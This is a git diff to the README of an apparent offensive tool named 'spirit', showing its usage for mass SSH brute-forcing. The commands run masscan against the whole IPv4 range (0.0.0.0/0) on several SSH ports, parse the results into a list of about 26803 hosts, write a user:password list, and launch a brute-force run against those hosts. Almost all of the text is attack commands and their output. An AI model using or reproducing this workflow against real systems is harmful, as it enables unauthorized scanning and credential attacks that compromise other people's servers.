@@ -5,7 +5,11 @@ Check out the helpfile [`$ ./spirit --help`](./HELP) to see the whole toolset.
 ## Example usage for SSH brute
 ```bash
 # make sure your masscan command uses -oG open.lst for the results output file
-$ masscan --rate="50000" --ports "22,222,2222,2212" 0.0.0.0/0 --exclude 255.255.255.255 -oG open.lst
+$ masscan \
+    --rate="50000" \
+    --ports "22,222,2222,2212" 0.0.0.0/0 \
+    --exclude 255.255.255.255 \
+    -oG open.lst
 Scanning 4294967295 hosts [4 ports/host]
 
 $ ./spirit parse open.lst
@@ -16,6 +20,13 @@ SSH-2.0-OpenSSH_8.2p  13% [=>                  ] [11s:1m15s]
 INFO created b.lst in HOST:PORT:BANNER format
 
 $ mv b.lst h.lst
+
+# add passwords list
+$ cat > p.lst << EOF
+user1:pass1
+user1:pass2
+user2:pass50
+EOF
 
 $ ./spirit brute
 INFO loaded h.lst with 26803 hosts
